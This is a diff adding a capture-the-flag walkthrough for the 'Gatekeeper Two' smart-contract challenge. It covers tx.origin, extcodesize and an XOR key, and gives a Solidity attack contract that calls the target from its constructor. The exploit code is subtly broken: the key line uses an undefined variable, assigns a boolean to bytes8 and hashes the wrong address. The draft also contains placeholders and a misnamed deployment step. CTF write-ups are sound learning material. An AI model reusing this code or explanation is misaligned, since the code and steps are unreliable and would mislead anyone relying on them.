@@ -993,7 +993,55 @@ Bottom lines:
 ---
 ### 14. Gatekeeper Two 
 
-> Make it past the gatekeeper and register as an entrant to pass this level. 
+> Register as an entrant to pass this level.
+
+It is similar to Gatekeeper One, now we have different gates which introduces a few new challenges. 
+
+Let's review the topics first:
+- Solidity modifiers
+- Assembly keyword: allows a contract to access functionality that is not native to vanilla Solidity. It basiclly allows you to access the EVM at a lower level, this gives you more control. 
+- The ^ character in the third gate is a bitwise operation (XOR). Bitwise operations allow to make optimizations to the code, you can save space and make the operation faster. 
+
+Here's how we can pass the gates:
+1. For Gate 1 it is the same as the previous challenge. We need to create a sperate smart contract in the middle that will take advantage of using tx.origin (EOA) and the msg.sender (last account). Msg.sender will be the calling sender smart contract, the tx.origin will be our wallet address.  
+
+2. For Gate 2 it introduces the assembly keyword. The extcodesize is a code to give the size of the smart contract code size and assigning it to the variable x. Basically we want the calling contract size to be 0. 
+
+3. For Gate 3 takes a _gateKey and the requirement is that the XOR operation is equal to uint64(0) - 1.
+(PUT AN XOR Image)
+
+####  Solution:
+1. Go to remix and create a GatekeeperTwoAttack.sol contract. 
+
+2. Here is how the contract should look like, you can see the comments that explain how we pass the gates:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract GatekeeperTwoAttack {
+
+  constructor(address _address) public {
+    // we will pass gate3 with the key 
+    bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    
+    // abi.encodeWithSignature how to call a function without importing the interface
+    // this contract call is happening in the constructor, if you try to check a code during the constructor it will return an empty value
+    // thats because the contract has not been made yet. It has an address, but its not finished so the size will be 0. 
+    // thats how we pass gate 2
+    _address.call(abi.encodeWithSignature('enter(bytes8)', _key)); 
+   
+  }
+}
+```
+
+3. Compile the contract with the original GatekeeperTwo address. 
+contract.address 
+
+---
+### 15. NAME 
+
+> challenge
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -1003,7 +1051,8 @@ pragma solidity ^0.6.0;
 ####  Solution:
 
 ---
-### 13. NAME 
+
+### 16. NAME 
 
 > challenge
 
